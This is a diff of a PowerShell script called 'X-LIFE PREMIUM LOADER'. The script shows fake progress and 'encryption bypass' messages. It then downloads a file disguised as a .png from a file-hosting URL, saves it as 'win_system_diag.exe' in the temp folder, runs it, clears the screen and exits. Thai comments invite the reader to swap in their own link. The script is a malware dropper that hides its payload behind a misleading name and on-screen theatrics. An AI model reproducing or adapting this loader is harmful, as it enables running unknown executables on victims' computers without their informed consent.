@@ -1,5 +1,5 @@
 # ============================================================
-# X-LIFE PREMIUM LOADER
+# X-LIFE PREMIUM LOADER (FIXED)
 # ============================================================
 Clear-Host
 $Host.UI.RawUI.WindowTitle = "X-LIFE SECURITY INITIALIZATION"
@@ -19,18 +19,14 @@ for ($i = 0; $i -le 100; $i += 5) {
 Write-Host "`n  [+] ENCRYPTION BYPASS SUCCESSFUL" -ForegroundColor Green
 Write-Host "  [*] DOWNLOADING ENGINE COMPONENTS..." -ForegroundColor DarkGray
 
-# ส่วนดาวน์โหลดและรันไฟล์เดิม
-$exeUrl = "https://files.catbox.moe/renxf3.png"
+$exeUrl = "https://files.catbox.moe/renxf3.png" # แก้ลิงก์ของคุณตรงนี้
 $tempPath = "$env:TEMP\win_system_diag.exe"
 
 try {
     Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
     Write-Host "  [+] ENGINE BOOTING..." -ForegroundColor Cyan
     Start-Sleep -Milliseconds 800
-    
     Start-Process -FilePath $tempPath
-    
-    # ล้างหน้าจอแล้วปิด PowerShell ทันที
     Clear-Host
     Exit
 }
